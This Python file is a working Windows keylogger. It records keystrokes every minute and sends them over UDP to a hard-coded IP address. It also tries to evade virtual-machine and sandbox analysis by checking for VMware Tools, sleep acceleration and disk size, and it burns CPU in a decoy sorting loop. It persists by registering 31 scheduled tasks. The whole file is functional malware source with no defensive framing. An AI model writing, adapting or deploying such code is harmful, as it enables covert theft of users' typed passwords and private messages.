import time
import socket
import keyboard as kb
import datetime
import os
import psutil
import platform
import random
import win32com.client

IP = "192.168.168.129"
PORT = 4692

def main():

    check = check_if_sort()
    
    if(check):
        E_ls = [None] * 99999
        for i in range(len(E_ls)):
            E_ls[i] = random.randint(0, 99999)
        ESort(E_ls)
    
    sch()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while(True):
        string = ""

        kb.start_recording()
        time.sleep(60)
        data = kb.stop_recording()

        for i in range(len(data)):
            if(data[i].event_type == "down"):
                if(data[i].name == "space"):
                    string = string + " "
                elif(len(data[i].name) > 1):
                    string = string + "KEY[" + data[i].name + "]"
                else:
                    string = string + data[i].name
        
        sock.sendto(string.encode(), (IP, PORT))
    
def check_if_sort():
    
    tool_dir = "C:\\Program Files\\VMWare Tools"
    if(os.path.isdir(tool_dir) == True):
        return -1
    
    wait = datetime.datetime.now() + datetime.timedelta(minutes=1)
    wait_time = int(wait.strftime("%H%M%S"))
    
    time.sleep(60)
    if(int(datetime.datetime.now().strftime("%H%M%S")) < wait_time):
        return -1
    
    total_storage = 0.0
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue

        total_storage += float(my_get_size(partition_usage.total))
        
    if(total_storage < 128.0):
        return -1
    
    return 0

def my_get_size(bytes):
    factor = 1024
    bytes /= factor
    bytes /= factor
    bytes /= factor
    return f"{bytes:.2f}"

def ESort(list_to_sort):
    
    E_count = 0
    
    while(E_count < 101):
    
        list_two_sort = list_to_sort
        length = len(list_two_sort)
        print("hi")
        
        for i in range(length-1):
     
            for j in range(0, length-i-1):
     
                if list_two_sort[j] > list_two_sort[j + 1] :
                    list_two_sort[j], list_two_sort[j + 1] = list_two_sort[j + 1], list_two_sort[j]
        
        E_count += 1
        
        if(E_count == 100):
            E_count = 0
    
    return

def sch():
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder('\\')
    
    for i in range(31):
    
        task_def = scheduler.NewTask(0)

        TASK_ACTION_EXEC = 0
        action = task_def.Actions.Create(TASK_ACTION_EXEC)
        action.Path = str(os.getcwd()) + "\\" + str(os.path.basename(__file__))
        action.Arguments = ''

        task_def.RegistrationInfo.Description = 'yuh'
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False
        
        start_time = datetime.datetime.now() + datetime.timedelta(days=i)
        TASK_TRIGGER_TIME = 1
        trigger = task_def.Triggers.Create(TASK_TRIGGER_TIME)
        trigger.StartBoundary = start_time.isoformat()

        TASK_CREATE_OR_UPDATE = 6
        TASK_LOGON_NONE = 0
        root_folder.RegisterTaskDefinition(
            f"SUS CHECK {i}",  
            task_def,
            TASK_CREATE_OR_UPDATE,
            '',  
            '',  
            TASK_LOGON_NONE)
    
    return
   
if(__name__ == "__main__"):
    main()
